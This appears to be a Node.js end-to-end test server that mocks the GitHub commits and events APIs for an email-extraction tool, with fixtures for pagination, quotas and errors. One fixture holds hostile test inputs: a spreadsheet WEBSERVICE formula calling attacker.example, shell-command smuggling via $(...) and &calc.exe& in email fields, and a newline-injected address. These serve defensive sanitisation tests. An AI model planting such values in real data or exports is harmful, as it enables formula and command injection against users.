// The E2E loopback server: serves the built site AND a mock of the
// GitHub API on the SAME origin - so no CSP change is needed (the mock
// answers under 'self', exactly what the page's policy allows). The
// scan.js is served with its API base patched to the empty string
// (same-origin), which the runtime override supports explicitly.
//
// Fixtures are named targets, one per scenario:
//   demo/normal    two pages, mixed identities (quoted email, noreply
//                  author, injection attempt)
//   demo/multi     three pages (multi-page walk)
//   demo/noreply   every author on the noreply domain: zero results
//   demo/quoted    the git-permitted quoting must be trimmed
//   demo/empty     409: the CLI's empty-repository contract
//   demo/ghost     404: the named resource-not-found error
//   demo/quotadead page 1 answers, page 2 is quota-exhausted: PARTIAL
//   demo/estimate  a full page with a Link header: the ~N estimate
//   demo/blocked   a secondary 403 (remaining > 0): not the hourly quota
//   demo/ghost/tree/main  a /tree/… passthrough name: the API answers 404
//   users/demo     events from two repositories (per-event attribution)
//   users/capped   three FULL pages: the 300-event cap is announced

const http = require("node:http");
const fs = require("node:fs");
const path = require("node:path");

const SITE = process.env.SITE_DIR || path.join(__dirname, "..", "site", "public");
const PORT = Number(process.env.PORT || 8931);

const RESET = Math.floor(Date.now() / 1000) + 3600;
const HEADERS = {
  "Content-Type": "application/json",
  "X-RateLimit-Remaining": "42",
  "X-RateLimit-Reset": String(RESET),
};

// A full per_page=100 page: two named commits (the test's discriminators)
// plus filler commits so the walk cannot stop after page 1.
function fullCommitPage(name1, email1, name2, email2) {
  const page = [commit(name1, email1, "2024-01-01T00:00:00Z"), commit(name2, email2, "2024-02-01T00:00:00Z")];
  for (let i = 0; page.length < 100; i++) {
    page.push(commit("Filler " + i, "filler" + i + "@example.com", "2024-01-15T00:00:00Z"));
  }
  return page;
}

function commit(author, email, date, committerEmail) {
  return {
    commit: {
      author: { name: author, email, date },
      committer: { name: author, email: committerEmail || email },
    },
  };
}

function eventsPage(repo, count, date) {
  const events = [];
  for (let i = 0; i < count; i++) {
    if (i % 10 === 5) {
      events.push({ type: "WatchEvent", repo: { name: repo } });
      continue;
    }
    events.push({
      type: "PushEvent",
      repo: { name: repo },
      created_at: date,
      payload: {
        commits: [
          {
            author: { name: "Jane Doe", email: "jane@example.com" },
          },
        ],
      },
    });
  }
  return events;
}

function send(res, status, body, extra) {
  res.writeHead(status, { ...HEADERS, ...extra });
  res.end(body === undefined ? "" : JSON.stringify(body));
}

const routes = {
  "/repos/demo/normal/commits": (url) => {
    const page = Number(url.searchParams.get("page") || 1);
    if (page === 1) {
      return [
        commit("Jane Doe", "jane@example.com", "2024-06-01T12:00:00Z"),
        commit("Jane Doe", "\"jane.quoted@example.com\"", "2024-05-01T12:00:00Z"),
        commit("Old Alias", "42+oldname@users.noreply.github.com", "2019-01-01T00:00:00Z"),
        {
          commit: {
            author: { name: "Injection", email: "evil@x.com\n evil@x.com" },
            committer: { name: "Injection", email: "c@example.com" },
          },
        },
      ];
    }
    return [];
  },
  "/repos/demo/multi/commits": (url, res) => {
    const page = Number(url.searchParams.get("page") || 1);
    if (page === 1) {
      // a FULL first page (GitHub-shaped: paginated listings always carry
      // a Link header) - the walk must reach page 2, where a second Alice
      // commit makes the aggregate only provable with both pages read
      const link = (rel, pageNo) =>
        `<http://127.0.0.1:${PORT}/repos/demo/multi/commits?per_page=100&page=${pageNo}>; rel="${rel}"`;
      send(res, 200, fullCommitPage("Alice", "alice@example.com", "Bob", "bob@example.com"),
        { Link: `${link("next", 2)}, ${link("last", 2)}` });
      return;
    }
    if (page === 2) {
      return [commit("Alice", "alice@example.com", "2024-03-01T00:00:00Z")];
    }
    return [];
  },
  "/repos/demo/estimate/commits": (url, res) => {
    const page = Number(url.searchParams.get("page") || 1);
    if (page === 1) {
      // a FULL first page + a Link rel="last" pointing at page 2: the
      // estimate must announce "about 2 requests"; the delayed page 2
      // widens the transient window so the assertion is not a race
      const link = (rel, pageNo) =>
        `<http://127.0.0.1:${PORT}/repos/demo/estimate/commits?per_page=100&page=${pageNo}>; rel="${rel}"`;
      send(res, 200, fullCommitPage("Erin", "erin@example.com", "Frank", "frank@example.com"),
        { Link: `${link("next", 2)}, ${link("last", 2)}` });
      return;
    }
    setTimeout(() => {
      send(res, 200, [commit("Gina", "gina@example.com", "2024-07-03T00:00:00Z")]);
    }, 250);
    return undefined;
  },
  "/repos/demo/noreply/commits": () => [
    commit("Alias", "1+alias@users.noreply.github.com", "2024-01-01T00:00:00Z"),
    commit("Alias2", "2+alias@users.noreply.github.com", "2024-01-02T00:00:00Z"),
  ],
  "/repos/demo/quoted/commits": () => [
    commit("Dev", "\"dev@example.com\"", "2024-04-01T00:00:00Z"),
  ],
  "/repos/demo/empty/commits": (url, res) => send409(res),
  "/repos/demo/ghost/commits": (url, res) => send404(res),
  "/repos/demo/blocked/commits": (url, res) => {
    // a SECONDARY refusal: 403 with remaining > 0 - not the hourly quota
    res.writeHead(403, {
      ...HEADERS,
      "X-RateLimit-Remaining": "30",
    });
    res.end(JSON.stringify({ message: "Repository access blocked" }));
    return undefined;
  },
  "/repos/demo/quotadead/commits": (url, res) => {
    const page = Number(url.searchParams.get("page") || 1);
    if (page === 1) {
      // a FULL first page, GitHub-shaped (Link header included): the walk
      // must continue to page 2, where the quota dies (a short page 1
      // would end the walk before the 403)
      const link = (rel, pageNo) =>
        `<http://127.0.0.1:${PORT}/repos/demo/quotadead/commits?per_page=100&page=${pageNo}>; rel="${rel}"`;
      send(res, 200, fullCommitPage("Jane Doe", "jane@example.com", "Filler 0", "filler0@example.com"),
        { Link: `${link("next", 2)}, ${link("last", 2)}` });
      return;
    }
    res.writeHead(403, {
      ...HEADERS,
      "X-RateLimit-Remaining": "0",
    });
    res.end(JSON.stringify({ message: "API rate limit exceeded" }));
    return undefined;
  },
  "/repos/demo/inject/commits": (url) => {
    const page = Number(url.searchParams.get("page") || 1);
    if (page === 1) {
      return [
        commit("=WEBSERVICE\t(\"https://attacker.example\")",
          "hostile@example.com", "2024-04-01"),
        commit("Shell Tip", "x$(touch${IFS}pwned)@guarded.example",
          "2024-04-02"),
        commit("Cmd Run", "x@y.com&calc.exe&", "2024-04-03"),
        commit("Backslash Tip", "x\\@x.com", "2024-04-04"),
        commit("Domain Junk", "dev@x,com", "2024-04-05"),
        commit("Dot Junk", "dev@..", "2024-04-07"),
        commit("Formula Mail", "=x@y.com", "2024-04-06"),
        commit("Jane Doe", "jane@example.com", "2024-04-02"),
      ];
    }
    return [];
  },
  "/repos/demo/quiet/commits": () => [],
  "/repos/demo/p1dead/commits": (url, res) => {
    // the quota dies on the VERY FIRST request: rawCount stays 0 and the
    // zero-branch why-note must not claim an empty history
    send(res, 403, { message: "API rate limit exceeded" },
      { "X-RateLimit-Remaining": "0" });
    return undefined;
  },
  "/repos/demo/localart/commits": () => [
    // commit-machine identities: honest data, poor contact leads - the
    // funnel demotes them, the data keeps them
    commit("user", "root@localhost", "2024-01-01"),
    commit("CI Bot", "ci@build.local", "2024-02-01"),
    commit("Jane Doe", "jane@example.com", "2024-03-01"),
  ],
  "/repos/demo/ghost/tree/main/commits": (url, res) => send404(res),
  "/users/demo/events/public": (url) => {
    const page = Number(url.searchParams.get("page") || 1);
    if (page === 1) {
      return [
        {
          type: "PushEvent",
          repo: { name: "demo/repoA" },
          created_at: "2024-06-01T12:00:00Z",
          payload: {
            commits: [{ author: { name: "Jane Doe", email: "jane@example.com" } }],
          },
        },
        {
          type: "PushEvent",
          repo: { name: "demo/repoB" },
          created_at: "2024-05-01T12:00:00Z",
          payload: {
            commits: [{ author: { name: "Jane Doe", email: "jane@example.com" } }],
          },
        },
        { type: "WatchEvent", repo: { name: "demo/repoA" } },
      ];
    }
    return [];
  },
  "/users/capped/events/public": (url) => {
    const page = Number(url.searchParams.get("page") || 1);
    if (page <= 3) {
      // a FULL page on the third one is what reaches the cap
      return eventsPage("demo/cappedrepo", 100, "2024-06-01T12:00:00Z");
    }
    return [];
  },
  "/users/quiet/events/public": () => [],
  "/users/ghost/events/public": (url, res) => send404(res),
};

function send409(res) {
  send(res, 409, { message: "Repository empty" });
}
function send404(res) {
  send(res, 404, { message: "Not Found" });
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://127.0.0.1:${PORT}`);
  const route = routes[url.pathname];
  if (route) {
    const body = route(url, res);
    if (body !== undefined) send(res, 200, body);
    return;
  }
  // static files from the built site; scan.js is served with its API base
  // patched to the empty string (same-origin mock, no CSP change needed)
  let filePath = path.join(SITE, url.pathname === "/" ? "index.html" : url.pathname);
  // a directory URL (e.g. /about/) resolves to its index page, like the
  // real GitHub Pages host: the capture and any visitor of this loopback
  // server must see the same page the deploy serves
  if (!path.extname(filePath)) filePath = path.join(filePath, "index.html");
  // path.relative instead of a prefix check: startsWith would also admit
  // a sibling directory sharing SITE's prefix, should SITE ever gain one
  const rel = path.relative(SITE, filePath);
  if (rel.startsWith("..") || path.isAbsolute(rel)) {
    res.writeHead(403);
    res.end();
    return;
  }
  fs.readFile(filePath, (err, data) => {
    if (err) {
      // the 404 page, like the real host
      fs.readFile(path.join(SITE, "404.html"), (err404, page404) => {
        res.writeHead(404, { "Content-Type": "text/html" });
        res.end(err404 ? "not found" : page404);
      });
      return;
    }
    const type = filePath.endsWith(".js")
      ? "text/javascript"
      : filePath.endsWith(".wasm")
        ? "application/wasm"
        : filePath.endsWith(".css")
          ? "text/css"
          : filePath.endsWith(".html")
            ? "text/html"
            : "application/octet-stream";
    let content = data;
    if (filePath.endsWith("scan.js")) {
      const source = data.toString();
      const marker = 'const API = window.GIT2MAIL_API_BASE ?? "https://api.github.com";';
      if (!source.includes(marker)) {
        // a silent no-op here would point the page at the real
        // api.github.com (the CSP allows it) and break the offline
        // invariant: detect at serve time, fail the run immediately
        throw new Error("scan.js API-base marker line drifted - the mock patch would no-op");
      }
      content = source.replace(marker, 'const API = window.GIT2MAIL_API_BASE ?? "";');
    }
    res.writeHead(200, { "Content-Type": type });
    res.end(content);
  });
});

if (require.main === module) {
  server.listen(PORT, () => {
    console.log(`e2e server on http://127.0.0.1:${PORT} (site: ${SITE})`);
  });
}

module.exports = { server, PORT };
